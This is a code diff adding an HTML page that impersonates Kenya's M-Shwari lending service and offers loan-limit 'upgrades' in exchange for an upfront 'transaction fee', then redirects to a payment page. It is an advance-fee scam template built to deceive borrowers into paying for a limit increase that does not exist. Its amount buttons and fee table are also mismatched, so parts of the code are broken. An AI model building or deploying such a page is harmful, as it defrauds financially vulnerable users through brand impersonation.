@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Increase M-SHWARI Loan Limit</title>
+
+<style>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Arial,sans-serif;
+}
+
+body{
+background:#f3f3f3;
+}
+
+.header{
+background:#49B72F;
+color:white;
+padding:20px;
+text-align:center;
+font-size:20px;
+font-weight:bold;
+position:sticky;
+top:0;
+}
+
+.container{
+padding:15px;
+}
+
+.notice{
+background:white;
+padding:18px;
+border-radius:15px;
+box-shadow:0 2px 10px rgba(0,0,0,.08);
+margin:15px 0;
+font-size:14px;
+line-height:1.6;
+color:#333;
+}
+
+h3{
+margin:15px 0;
+color:#333;
+}
+
+.grid{
+display:grid;
+grid-template-columns:1fr 1fr;
+gap:15px;
+}
+
+.card{
+background:white;
+padding:20px;
+border-radius:15px;
+box-shadow:0 2px 10px rgba(0,0,0,.08);
+text-align:center;
+cursor:pointer;
+transition:0.3s;
+border:2px solid transparent;
+}
+
+.card:hover{
+transform:scale(1.03);
+border:2px solid #49B72F;
+}
+
+.amount{
+font-size:18px;
+font-weight:bold;
+color:#49B72F;
+}
+
+/* POPUP */
+.popup-overlay{
+display:none;
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(0,0,0,.6);
+justify-content:center;
+align-items:center;
+z-index:999;
+}
+
+.popup{
+background:white;
+width:90%;
+max-width:350px;
+padding:20px;
+border-radius:15px;
+text-align:center;
+animation:fadeIn 0.3s ease;
+}
+
+@keyframes fadeIn{
+from{transform:scale(0.8);opacity:0}
+to{transform:scale(1);opacity:1}
+}
+
+.popup h3{
+color:#49B72F;
+margin-bottom:10px;
+}
+
+.popup p{
+font-size:14px;
+margin:8px 0;
+color:#333;
+}
+
+.highlight{
+color:#49B72F;
+font-weight:bold;
+}
+
+.btn{
+margin-top:15px;
+width:100%;
+padding:15px;
+background:#49B72F;
+border:none;
+color:white;
+font-size:16px;
+border-radius:10px;
+font-weight:bold;
+cursor:pointer;
+}
+
+.btn:hover{
+background:#3fa125;
+}
+
+.small{
+font-size:12px;
+color:#666;
+margin-top:8px;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="header">
+Increase Your M-SHWARI Loan Limit
+</div>
+
+<div class="container">
+
+<div class="notice">
+
+<b>Loan Limit Upgrade Notice</b><br><br>
+
+To improve your borrowing power, you can request an increase of your current M-SHWARI loan limit.  
+This process helps the system verify and upgrade your account to a higher lending tier.
+
+<br><br>
+
+<b>Important:</b> A small transaction fee is required to complete this upgrade. This fee confirms your request and activates the limit review process.
+
+<div class="info-box">
+✔ Fast Processing<br>
+✔ Secure System Verification<br>
+✔ Instant Loan Limit Update After Approval
+</div>
+
+</div>
+
+<h3>Select Your Preferred Loan Limit Increase</h3>
+
+<div class="small">
+Choose an amount below. The system will automatically calculate your transaction cost before payment.
+Only approved users will receive upgraded limits after successful processing.
+</div>
+
+<h3>Select New M-SHWARI Limit To Increase</h3>
+
+<div class="grid">
+
+<div class="card" onclick="selectAmount(5000)">
+<div class="amount">KSH 5,000</div>
+</div>
+
+<div class="card" onclick="selectAmount(10000)">
+<div class="amount">KSH 10,000</div>
+</div>
+
+<div class="card" onclick="selectAmount(15000)">
+<div class="amount">KSH 20,000</div>
+</div>
+
+<div class="card" onclick="selectAmount(20000)">
+<div class="amount">KSH 30,000</div>
+</div>
+
+<div class="card" onclick="selectAmount(30000)">
+<div class="amount">KSH 40,000</div>
+</div>
+
+<div class="card" onclick="selectAmount(45000)">
+<div class="amount">KSH 50,000</div>
+</div>
+
+<div class="card" onclick="selectAmount(50000)">
+<div class="amount">KSH 65,000</div>
+</div>
+
+</div>
+
+</div>
+
+<!-- POPUP -->
+<div class="popup-overlay" id="popup">
+
+<div class="popup">
+
+<h3>Transaction Summary</h3>
+
+<p>Selected Limit Increase: <b>KSH <span id="selectedAmount"></span></b></p>
+
+<p>Transaction Fee (Required): <b class="highlight">KSH <span id="transactionCost"></span></b></p>
+
+<p class="small">
+
+You are one step away from unlocking a higher M-SHWARI loan limit.  
+Pay the Transaction fee to activate your request and initiate instant review.
+
+<br><br>
+
+<b>Why this fee?</b> It helps secure your application, verify eligibility, and activate priority loan limit processing.
+
+</p>
+
+<button class="btn" onclick="continuePayment()">
+Activate My New M-SHWARI Loan Limit
+</button>
+
+</div>
+
+</div>
+
+<script>
+
+let selectedAmount = 0;
+
+function getCost(amount){
+switch(amount){
+case 5000: return 2;
+case 10000: return 550;
+case 20000: return 650;
+case 30000: return 750;
+case 40000: return 850;
+case 50000: return 1050;
+case 65000: return 1250;
+default: return 0;
+}
+}
+
+function selectAmount(amount){
+
+selectedAmount = amount;
+
+let cost = getCost(amount);
+
+document.getElementById("selectedAmount").innerText = amount;
+document.getElementById("transactionCost").innerText = cost;
+
+document.getElementById("popup").style.display = "flex";
+
+localStorage.setItem("boostAmount", amount);
+localStorage.setItem("transactionCost", cost);
+}
+
+function continuePayment(){
+window.location.href = "payment1.html";
+}
+
+</script>
+
+</body>
+</html>
